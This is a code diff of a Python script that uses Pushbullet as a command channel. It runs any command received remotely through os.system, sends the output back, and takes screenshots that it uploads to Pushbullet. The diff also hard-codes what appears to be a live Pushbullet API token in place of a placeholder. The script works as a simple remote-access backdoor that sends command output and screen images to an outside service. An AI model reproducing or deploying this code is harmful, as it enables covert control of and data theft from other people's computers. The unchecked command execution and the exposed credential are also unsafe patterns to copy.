@@ -1,5 +1,6 @@
 import os  # Python module for mimicking actions done by native operating system
 from pushbullet import Pushbullet  # Install this module using "sudo pip install pushbullet.py"
+import pyscreenshot as ImageGrab
 
 
 class PB:                           # This class contains all the functions required
@@ -20,7 +21,7 @@ class PB:                           # This class contains all the functions requ
     def send(self, title, body):
         """
         # Sending a message to pushbullet (can be read from any device)
-        
+
         """
         try:
             self.authorise().push_note(title, body)  # Sending message
@@ -55,7 +56,8 @@ class PB:                           # This class contains all the functions requ
         For executing the command received
         """
         if self.get_cmd() == "ss":
-            os.system("screencapture dude.jpeg")
+            im =ImageGrab.grab()
+            im.save("dude.png")
             return os.system('echo "ss" > templog.txt')
         else:
             return os.system(self.get_cmd() + " > templog.txt")  # Executes and writes into the file templog.txt
@@ -72,8 +74,8 @@ class PB:                           # This class contains all the functions requ
                 final_string = ''.join(final_string)
                 print(final_string)
                 if final_string == "ss\n":
-                    op = open('dude.jpeg', 'rb')
-                    filedata=self.authorise().upload_file(op, "dude.jpeg")
+                    op = open('dude.png', 'rb')
+                    filedata=self.authorise().upload_file(op, "dude.png")
                     self.authorise().push_file(**filedata)
                 else:
                     self.send("Output of "+self.get_cmd()+" :", final_string)
@@ -82,7 +84,7 @@ class PB:                           # This class contains all the functions requ
 
 
 if __name__ == "__main__":
-    First = PB("Your Api")  # API token from https://www.pushbullet.com/#settings
+    First = PB("o.yqIPPbf59UYCifxOY6lSoenjIpoFetHq")  # API token from https://www.pushbullet.com/#settings
     First.send_output()
 
 
